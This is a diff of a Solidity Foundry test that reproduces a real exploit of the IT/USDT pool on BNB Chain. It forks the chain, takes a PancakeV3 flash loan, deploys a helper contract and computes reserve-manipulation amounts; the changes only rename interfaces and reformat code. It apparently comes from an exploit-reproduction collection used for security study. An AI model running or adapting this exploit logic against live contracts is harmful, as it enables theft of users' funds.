@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // TX : https://phalcon.blocksec.com/explorer/tx/bsc/0xb33057f57ce451aa8cbb65508d298fe3c627509cc64a394736dace2671b6dcfa
 // GUY : https://twitter.com/0xNickLFranklin/status/1768171595561046489
@@ -12,11 +11,10 @@ import "./../interface.sol";
 
 contract ContractTest is Test {
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    Uni_Pair_V3 pool = Uni_Pair_V3(0x92b7807bF19b7DDdf89b706143896d05228f3121);
-    Uni_Pair_V2 IT_USDT = Uni_Pair_V2(0x7265553986a81c838867aA6B3625ABA97B961f00);
+    IUniswapV3Pair pool = IUniswapV3Pair(0x92b7807bF19b7DDdf89b706143896d05228f3121);
+    IUniswapV2Pair IT_USDT = IUniswapV2Pair(0x7265553986a81c838867aA6B3625ABA97B961f00);
     // token0 IT token1 USDT
-    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 IT = IERC20(0x1AC5Fac863c0a026e029B173f2AE4D33938AB473);
     uint256 constant PRECISION = 10 ** 18;
@@ -24,7 +22,7 @@ contract ContractTest is Test {
     address hack_contract;
 
     function setUp() external {
-        cheats.createSelectFork("bsc", 36_934_258);
+        vm.createSelectFork("bsc", 36_934_258);
         deal(address(USDT), address(this), 0);
     }
 
@@ -34,7 +32,12 @@ contract ContractTest is Test {
         emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
     }
 
-    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {
+    function pancakeV3FlashCallback(
+        uint256 fee0,
+        uint256,
+        /*fee1*/
+        bytes memory /*data*/
+    ) public {
         bytes memory bytecode = type(Money).creationCode;
         uint256 _salt = 0;
         bytecode = abi.encodePacked(bytecode, abi.encode(test_contract));
@@ -99,18 +102,18 @@ contract ContractTest is Test {
             tokenReserve = uint256(reserve1);
             usdtReserve = uint256(reserve0);
         }
-        tokenUsdtRate = uint256(usdtReserve) * (PRECISION) / (uint256(tokenReserve));
+        tokenUsdtRate = (uint256(usdtReserve) * (PRECISION)) / (uint256(tokenReserve));
 
         // uint256 k = tokenReserve.mul(usdtReserve);
 
         uint256 tokenReserveAfterBuy = tokenReserve - amount;
         // uint256 usdtReserveAfterBuy = k.div(tokenReserveAfterBuy);
         uint256 usdtReserveAfterBuy =
-            this.min(tokenReserve * (usdtReserve) / (tokenReserveAfterBuy), USDT.balanceOf(address(IT_USDT))); // min impltementing rule 3
+            this.min((tokenReserve * (usdtReserve)) / (tokenReserveAfterBuy), USDT.balanceOf(address(IT_USDT))); // min impltementing rule 3
 
         uint256 maxTokenUsdtRateAfterBuy = tokenUsdtRate + (tokenUsdtRate / (100));
 
-        uint256 tokenMinReserveAfterBuy = usdtReserveAfterBuy * (PRECISION) / (maxTokenUsdtRateAfterBuy);
+        uint256 tokenMinReserveAfterBuy = (usdtReserveAfterBuy * (PRECISION)) / (maxTokenUsdtRateAfterBuy);
 
         if (tokenReserveAfterBuy >= tokenMinReserveAfterBuy) {
             return amount / 2;
